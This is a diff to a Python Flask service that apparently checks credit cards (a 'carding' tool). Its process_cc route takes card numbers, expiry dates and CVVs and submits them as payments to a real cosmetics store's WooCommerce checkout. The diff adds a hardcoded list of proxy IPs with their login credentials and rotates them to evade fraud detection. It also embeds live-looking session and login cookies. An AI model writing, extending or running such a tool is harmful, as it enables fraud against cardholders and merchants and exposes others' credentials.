@@ -3,19 +3,37 @@ import re
 import json
 import uuid
 from flask import Flask, jsonify, request
+from itertools import cycle
 
 app = Flask(__name__)
 
+proxies_list = [
+    "142.111.48.253:7030:fvbysspi:bsbh3trstb1c",
+    "31.59.20.176:6754:fvbysspi:bsbh3trstb1c",
+    "38.170.176.177:5572:fvbysspi:bsbh3trstb1c",
+    "198.23.239.134:6540:fvbysspi:bsbh3trstb1c",
+    "45.38.107.97:6014:fvbysspi:bsbh3trstb1c",
+    "107.172.163.27:6543:fvbysspi:bsbh3trstb1c",
+    "64.137.96.74:6641:fvbysspi:bsbh3trstb1c",
+    "216.10.27.159:6837:fvbysspi:bsbh3trstb1c",
+    "142.111.67.146:5611:fvbysspi:bsbh3trstb1c",
+    "142.147.128.93:6593:fvbysspi:bsbh3trstb1c"
+]
+
+proxies_cycle = cycle(proxies_list)
+
 class EcosmeticsPayment:
-    def __init__(self):
+    def __init__(self, proxy=None):
         self.session = requests.Session()
+        if proxy:
+            self.session.proxies.update({'http': proxy, 'https': proxy})
         self.cookies = {
             '_gcl_au': '1.1.472509716.1760778293',
             '_ga': 'GA1.1.260355234.1760778309',
             '__pr.d1zjip': '8r_agKnn9d',
             '_fbp': 'fb.1.1760778312473.662763495889949214',
             'cdn.ecosmeticsinc.101117.ka.ck': '53fa7ee3e97dc47fc0fdb6bff01d3347b1f4205055ba74fa07f143b5af5fdf331ebf0dc6f0e7cbe22f151321497ce5e7b1bf2a0c38217f2d680b51be36cc744bfe8fa687f3c23f9baffee1cccf0e8fe7f8f299a1bdd1c4a48ecab8e4593583f0daed8fb02e73d1f9f2418838f9731425fd22202760a067550d53f4265b0a5e29ad7fd9a60593354a92532bc7eeb9a9e4bedfc863b55e5e488c7bba',
-            '__kla_id': 'JTdCJTIyZW1haWwlMjIlM0ElMjJ4Y3JhY2tlcjEwJTQwZ21haWwuY29tJTIyJTJDJTIyZmlyc3RfbmFtZSUyMiUzQSUyMkpvaG4lMjIlMkMlMjJsYXN0X25hbWUlMjIlM0ElMjJTbWl0aCUyMiU3RA==',
+            '__kla_id': 'JTdCJTIyZW1haWwlMjIlM0AlMjJ4Y3JhY2tlcjEwJTQwZ21haWwuY29tJTIyJTJDJTIyZmlyc3RfbmFtZSUyMiUzQSUyMkpvaG4lMjIlMkMlMjJsYXN0X25hbWUlMjIlM0ElMjJTbWl0aCUyMiU3RA==',
             'wordpress_logged_in_9a1daefe07e3d628d7e9f4ff0d3f8220': 'john.smith-5615%7C1761988602%7CIKVPCr9eY6nRF12P8MX2yCQvbKWKAhNgpzJ9WIDhT7k%7Cfef4f7a586ba1e412ef9cb33688723e5c2e2df2dfaf91eb700765c6491bac72e',
             'wp_woocommerce_session_9a1daefe07e3d628d7e9f4ff0d3f8220': '9732510%7C1760951083%7C1760864683%7C%24generic%24RBilklGuEDlklAh3dPeHeDzvjieZFKrZD40LZfxu',
             'woocommerce_recently_viewed': '4340182',
@@ -251,7 +269,11 @@ def process_cc(cc):
     if len(exp_year) == 2:
         exp_year = '20' + exp_year
     
-    payment = EcosmeticsPayment()
+    proxy_str = next(proxies_cycle)
+    ip, port, user, pw = proxy_str.split(':')
+    proxy = f"http://{user}:{pw}@{ip}:{port}"
+    
+    payment = EcosmeticsPayment(proxy)
     result = payment.process_payment(card_number, exp_month, exp_year, cvv)
     
     return jsonify(result)
